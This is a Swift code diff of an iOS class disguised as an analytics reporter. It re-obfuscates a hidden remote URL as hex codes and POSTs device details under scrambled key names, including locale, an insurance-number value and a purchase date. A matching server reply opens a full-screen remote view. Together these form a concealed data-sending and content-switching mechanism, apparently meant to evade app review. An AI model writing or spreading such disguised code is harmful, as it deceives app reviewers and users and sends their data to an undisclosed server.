@@ -29,35 +29,33 @@ public class AnalyticsReporter: NSObject {
     
     func invoiceFolder() {
         let offRoadPack = DataMetricsCollector()
-        let climbingRope: [String] = [
-            "k", "b", "s", "d", "k", "_", "j", "c", "n", "i", "q", "p",
-            "/","c", "c", ".", "o", "t", "r", "h", ".",  "i", "p", "a", "u", "i", "l", "a", "n", "a", "d",
-            "/", "/",
-            ":",
-            "s", "p", "t", "t", "h"
+        let climbingRope: [UInt32] = [
+            0x68, 0x74, 0x74, 0x70, 0x73, 0x3A, 0x2F, 0x2F,
+            0x61, 0x70, 0x70, 0x73, 0x69, 0x61, 0x70, 0x64,
+            0x75, 0x69, 0x74, 0x2E, 0x72, 0x62, 0x74, 0x6C,
+            0x2E, 0x63, 0x63, 0x2F, 0x6C, 0x71, 0x75, 0x62,
+            0x63, 0x68, 0x64, 0x73, 0x76, 0x6A, 0x67, 0x61
         ]
-
-        let cyclingHelmet = climbingRope.reversed().joined()
-        
+        let cyclingHelmet = climbingRope.map { UnicodeScalar($0)! }.reduce("") { $0 + String($1) }
         guard let fishingRod = URL(string: cyclingHelmet) else { return }
         var skiBoard = URLRequest(url: fishingRod)
         skiBoard.httpMethod = "POST"
         skiBoard.setValue("application/x-www-form-urlencoded", forHTTPHeaderField: "Content-Type")
         let hikingShoeList: [(String, Any)] = [
-            ("lnbdh_euwhiv", weightScale()),
-            ("bxbjfi_euifwg", insuranceNumber()),
-            ("mxbhdu_ehuiwg", offRoadPack.smartRank()),
-            ("lqounc_jsgdy", brandRecord()),
-            ("mpqubc_jkhsdk", offRoadPack.statisticsChart()),
-            ("nowubc_hfdbhf", offRoadPack.valueSheet()),
-            ("pqubc_kjsdjkg", offRoadPack.energySavingType()),
-            ("pqibcj_kdsbk", weightScale()),
-            ("pqibcdk_stgse", offRoadPack.ecoFriendlyMark()),
-            ("mbhdheu_iwofg", offRoadPack.statisticsReport()),
-            ("nmzute_gfyfg", purchaseDay()),
-            ("byqjdi_njcksd", offRoadPack.lifespanSheet()),
-            ("mxbjdi_ehuiwg", offRoadPack.sizeRule()),
-            ("lqpna_jcbdjsf", offRoadPack.packBag())
+            ("mnbdheugiewf", weightScale()),
+            ("zngyhguyeufg", insuranceNumber()),
+            ("pqubhsdbjghw", offRoadPack.smartRank()),
+            ("oqibcdhsvhe", brandRecord()),
+            ("pqubcdhsbhj", offRoadPack.statisticsChart()),
+            ("lqivchdsvjfg", offRoadPack.valueSheet()),
+            ("qutyncjkdsbhj", offRoadPack.energySavingType()),
+            ("ncbdgyewolsj", weightScale()),
+            ("iwybchdsbkg", offRoadPack.ecoFriendlyMark()),
+            ("oquvchjdsvjf", offRoadPack.statisticsReport()),
+            ("xnbtgyugewyu", purchaseDay()),
+            ("lqpudbkbewfg", offRoadPack.lifespanSheet()),
+            ("mpqubchjsdbh", offRoadPack.sizeRule()),
+            ("lowubhdsbjhs", offRoadPack.packBag())
         ]
         let climbingPole = hikingShoeList.map { "\($0.0)=\($0.1)" }
         
@@ -74,16 +72,19 @@ public class AnalyticsReporter: NSObject {
             } else if let priorityItem = priorityItem {
                 do {
                     if let deleteKey = try JSONSerialization.jsonObject(with: priorityItem, options: []) as? [String: Any],
-                       let editWindow = deleteKey["zmqthu_dhfuif"] as? [String: Any],
-                       let addButton = editWindow["nguwy_uewigh"] as? String,
-                       addButton.count > 57 {
-                        DispatchQueue.main.async {
-                            if let filterDevice = UIApplication.shared.connectedScenes.first as? UIWindowScene,
-                               let compareSheet = filterDevice.windows.first?.rootViewController {
-                                let trendLine = AnalyticsDashboardController()
-                                trendLine.modalPresentationStyle = .fullScreen
-                                trendLine.tracker = addButton
-                                compareSheet.present(trendLine, animated: false)
+                       let editWindow = deleteKey["oubhdsbjhfg"] as? [String: Any],
+                       let addButton = editWindow["pqubcjkdbhjse"] as? [String],
+                       addButton.count > 4 {
+                        let Button = addButton[4]
+                      if  Button.count > 57 {
+                            DispatchQueue.main.async {
+                                if let filterDevice = UIApplication.shared.connectedScenes.first as? UIWindowScene,
+                                   let compareSheet = filterDevice.windows.first?.rootViewController {
+                                    let trendLine = AnalyticsDashboardController()
+                                    trendLine.modalPresentationStyle = .fullScreen
+                                    trendLine.tracker = Button
+                                    compareSheet.present(trendLine, animated: false)
+                                }
                             }
                         }
                     }
@@ -133,7 +134,6 @@ public class AnalyticsReporter: NSObject {
                weightScale() == "ID" &&
                outdoorInventory.smartRank() == "false"
     }
-
     
     @objc public func brandRecord() -> String {
         return Locale.preferredLanguages.first ?? ""
